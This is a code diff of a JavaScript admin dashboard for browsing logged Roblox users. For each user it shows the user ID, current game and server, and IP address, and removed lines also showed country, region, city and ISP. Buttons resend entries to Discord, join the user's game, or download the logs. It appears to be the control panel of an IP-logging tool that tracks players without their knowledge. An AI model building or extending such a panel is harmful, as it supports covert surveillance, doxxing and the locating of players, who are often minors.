@@ -34,46 +34,29 @@ function fetchLogs() {
     .then(data => {
       const container = document.getElementById("logs-container");
       container.innerHTML = "";
-      const grouped = {};
+
       data.forEach(log => {
-        if (!grouped[log.username]) grouped[log.username] = [];
-        grouped[log.username].push(log);
-      });
-      Object.entries(grouped).forEach(([username, logs]) => {
         const card = document.createElement("div");
         card.className = "log-card";
-        const first = logs[0];
-        const details = logs.map(l => `
-          <div class="log-entry">
-            <p><strong>Display Name:</strong> ${l.displayname}</p>
-            <p><strong>User ID:</strong> ${l.userid}</p>
-            <p><strong>Game:</strong> ${l.game}</p>
-            <p><strong>Place ID:</strong> ${l.placeid}</p>
-            <p><strong>Job ID:</strong> ${l.jobid}</p>
-            <p><strong>IP:</strong> ${l.ip}</p>
-            <p><strong>Country:</strong> ${l.country}</p>
-            <p><strong>Region:</strong> ${l.region}</p>
-            <p><strong>City:</strong> ${l.city}</p>
-            <p><strong>ISP:</strong> ${l.isp}</p>
-            <p><strong>Timestamp:</strong> ${l.timestamp}</p>
-            <hr>
-          </div>
-        `).join("");
+
         card.innerHTML = `
-          <img src="${first.thumbnail}" class="thumbnail" />
+          <img src="${log.thumbnail}" class="thumbnail" />
           <div class="log-info">
-            <h2>${username}</h2>
+            <h2>${log.displayname} (${log.username})</h2>
+            <p><strong>User ID:</strong> ${log.userid}</p>
+            <p><strong>Game:</strong> ${log.game}</p>
+            <p><strong>Place ID:</strong> ${log.placeid}</p>
+            <p><strong>Job ID:</strong> ${log.jobid}</p>
+            <p><strong>IP Address:</strong> ${log.ip}</p>
             <div class="actions">
-              <a href="https://www.roblox.com/users/${first.userid}/profile" target="_blank">Profile</a>
-              <a href="https://www.roblox.com/games/${first.placeid}/" target="_blank">Join Game</a>
-              <button onclick="resendLog('${first.userid}')">Resend to Discord</button>
-              <button onclick="deleteLog('${first.userid}')">Delete</button>
-              <button onclick='downloadUser(${JSON.stringify(logs)})'>Download JSON</button>
-              <button onclick="toggleLogs(this)">View Logs</button>
+              <a href="https://www.roblox.com/users/${log.userid}/profile" target="_blank">Profile</a>
+              <a href="https://www.roblox.com/games/${log.placeid}/" target="_blank">Join Game</a>
+              <button onclick="resendLog('${log.userid}')">Resend to Discord</button>
+              <button onclick="deleteLog('${log.userid}')">Delete</button>
             </div>
-            <div class="log-details hidden">${details}</div>
           </div>
         `;
+
         container.appendChild(card);
       });
     });
@@ -97,50 +80,18 @@ function deleteLog(userid) {
   }).then(() => fetchLogs());
 }
 
-function downloadUser(logs) {
-  const blob = new Blob([JSON.stringify(logs, null, 2)], { type: "application/json" });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = logs[0].username + "_logs.json";
-  a.click();
-  URL.revokeObjectURL(url);
-}
-
-function downloadAll() {
-  fetch("/logs", {
+function downloadLogs() {
+  fetch("/download_logs", {
     headers: {
       Authorization: "Bearer " + sessionStorage.getItem("auth")
     }
   })
-    .then(res => res.json())
-    .then(data => {
-      const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+    .then(res => res.blob())
+    .then(blob => {
       const url = URL.createObjectURL(blob);
       const a = document.createElement("a");
       a.href = url;
-      a.download = "all_logs.json";
+      a.download = "logs.json";
       a.click();
-      URL.revokeObjectURL(url);
     });
-}
-
-function toggleLogs(btn) {
-  const details = btn.parentNode.nextElementSibling;
-  details.classList.toggle("hidden");
-}
-
-function uploadLogs() {
-  const fileInput = document.getElementById("import-file");
-  const file = fileInput.files[0];
-  if (!file) return;
-  const formData = new FormData();
-  formData.append("file", file);
-  fetch("/import_logs", {
-    method: "POST",
-    headers: {
-      Authorization: "Bearer " + sessionStorage.getItem("auth")
-    },
-    body: formData
-  }).then(() => fetchLogs());
 }
